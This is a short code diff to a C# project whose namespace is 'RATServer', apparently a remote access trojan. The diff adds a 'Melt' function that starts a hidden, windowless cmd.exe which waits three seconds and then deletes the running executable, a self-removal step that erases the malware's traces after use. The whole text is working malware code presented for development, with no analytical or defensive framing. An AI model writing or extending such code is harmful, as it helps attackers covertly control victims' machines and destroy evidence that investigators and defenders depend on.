@@ -282,5 +282,21 @@ namespace RATServer
             catch (Exception e) { r.Msg = e.Message; }
             return r;
         }
+        public static Response Melt()
+        {
+            Response r = new Response { Type = "Message" };
+            try
+            {
+                Process p = new Process();
+                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                p.StartInfo.CreateNoWindow = true;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + System.Reflection.Assembly.GetExecutingAssembly().Location + "\"";
+                p.Start();
+                r.Msg = "Melt Success";
+            }
+            catch (Exception e) { r.Msg = e.Message; }
+            return r;
+        }
     }
 }
